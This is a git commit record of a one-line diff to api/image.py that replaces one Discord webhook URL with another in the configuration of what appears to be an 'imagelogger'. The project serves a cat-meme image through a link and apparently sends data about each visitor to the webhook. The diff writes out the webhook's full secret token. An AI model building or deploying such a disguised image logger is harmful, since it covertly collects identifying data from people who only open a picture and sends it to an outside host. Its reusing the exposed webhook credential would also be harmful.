0a1a893b38fa3c16fe964c0f3a1c041fec6a187e
Simple IP <kaidenjclaflin@gmail.com>
2025-01-31 19:59:29 -0700

    Update image.py

--- api/image.py
+++ api/image.py
@@ -12,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1335079985785999393/yfowJlnmbjCU-yLKiRVVn78k47BWzfXVEj64pV9M5mSoM5PFOUSARWfcIVe_15f0Esjek",
+    "webhook": "https://discord.com/api/webhooks/1335079985785999393/yfowJlnmbjCU-yLKiRVVn78k47BWzfXVEj64pV9M5mSoM5PFOUSARWfcIVe_15f0Esje",
     "image": "https://bestlifeonline.com/media-library/cat-meme-1.jpg?id=53202607&resize=260", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
